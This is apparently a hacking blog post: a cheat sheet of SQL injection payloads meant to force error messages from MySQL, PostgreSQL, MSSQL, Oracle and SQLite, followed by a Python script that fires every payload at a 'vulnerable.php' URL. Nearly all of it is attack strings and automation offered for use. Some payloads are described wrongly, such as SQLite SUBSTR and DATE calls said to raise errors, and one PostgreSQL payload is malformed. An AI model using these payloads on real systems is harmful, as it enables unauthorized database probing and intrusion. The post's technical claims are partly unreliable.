---
title: "Forcefully Generate Errors on Various DBMS"
tags: ['Hacking', 'SQLi']
date: 2024-10-03
toc: true
unlisted: true
author: 'Ren'
authorlink: 'https://about.0x0060.dev/'
---

## Advanced Methods


### Use of Invalid Functions

MySQL provides many functions that, when used incorrectly, can generate errors.

```
' AND EXP(~(SELECT * FROM (SELECT 1) t)) -- 
```

### Invalid Hexadecimal Conversion

Using invalid hexadecimal values can cause errors.

```
' AND 0xG1 -- 
```

### Subqueries in SELECT Clause

Use subqueries that return multiple rows in a single value context.

```
' AND (SELECT * FROM (SELECT 1,2) t) = 1 -- 
```

## PostgreSQL

### Invalid Regular Expression

PostgreSQL's regex functions can be used incorrectly to cause errors.

```
' AND 'a' ~ 'b[' -- 
```

### Invalid JSON Operations

Use JSON functions with invalid operations.

```
' AND jsonb_path_query_first('{"a":1}', '$.a') -- 
```

### Recursive CTE

Use recursive Common Table Expressions (CTE) incorrectly.

```
' AND WITH RECURSIVE t AS (SELECT 1 UNION ALL SELECT 1 FROM t) SELECT * FROM t -- 
```

## MSSQL

### Invalid XML Queries

MSSQL’s XML functions can generate errors when used with invalid XML.

```
; DECLARE @xml XML; SET @xml = '<root><a></a><b></b></root>'; SELECT @xml.value('(/root/c)[1]', 'INT') --
```

### Invalid Data Conversion

Conversion functions can cause errors when converting incompatible data types.

```
; SELECT CAST('text' AS INT) --
```

### SQL Injection with Error Functions

Use built-in error functions to generate errors.

```
; RAISERROR('Error generated', 16, 1) --
```

## Oracle

### Invalid Data Manipulation

Oracle’s specific functions and data manipulation can cause errors.

```
' UNION SELECT UTL_INADDR.get_host_address('invalid_host') FROM dual --
```

### Invalid XMLType Usage

Use XMLType improperly to cause errors.

```
' UNION SELECT XMLType('<invalid><xml>') FROM dual --
```

### Using `SYS.DBMS_ASSERT`

Leverage Oracle’s assertion package to force errors.

```
' UNION SELECT SYS.DBMS_ASSERT.noop('invalid_input') FROM dual --
```

## SQLite

### Invalid String Functions

SQLite’s string functions can generate errors when used improperly.

```
' UNION SELECT SUBSTR('text', -1, 1) --
```

### Invalid Mathematical Operations

Use mathematical functions with invalid inputs.

```
' UNION SELECT POW('text', 2) --
```

### Invalid Date Functions

Use date functions with incorrect parameters.

```
' UNION SELECT DATE('invalid_date') --
```

## Python Script to Force Errors

Automating Error Injection:

```
import requests

url = "http://example.com/vulnerable.php"
payloads = [
    # MySQL
    "' AND EXP(~(SELECT * FROM (SELECT 1) t)) -- ",
    "' AND 0xG1 -- ",
    "' AND (SELECT * FROM (SELECT 1,2) t) = 1 -- ",
    # PostgreSQL
    "' AND 'a' ~ 'b[' -- ",
    "' AND jsonb_path_query_first('{'a':1}', '$.a') -- ",
    "' AND WITH RECURSIVE t AS (SELECT 1 UNION ALL SELECT 1 FROM t) SELECT * FROM t -- ",
    # MSSQL
    "; DECLARE @xml XML; SET @xml = '<root><a></a><b></b></root>'; SELECT @xml.value('(/root/c)[1]', 'INT') -- ",
    "; SELECT CAST('text' AS INT) -- ",
    "; RAISERROR('Error generated', 16, 1) -- ",
    # Oracle
    "' UNION SELECT UTL_INADDR.get_host_address('invalid_host') FROM dual -- ",
    "' UNION SELECT XMLType('<invalid><xml>') FROM dual -- ",
    "' UNION SELECT SYS.DBMS_ASSERT.noop('invalid_input') FROM dual -- ",
    # SQLite
    "' UNION SELECT SUBSTR('text', -1, 1) -- ",
    "' UNION SELECT POW('text', 2) -- ",
    "' UNION SELECT DATE('invalid_date') -- ",
]

for payload in payloads:
    response = requests.get(url, params={"id": payload})
    print(f"Payload: {payload}")
    print(f"Response: {response.text}\n")
```
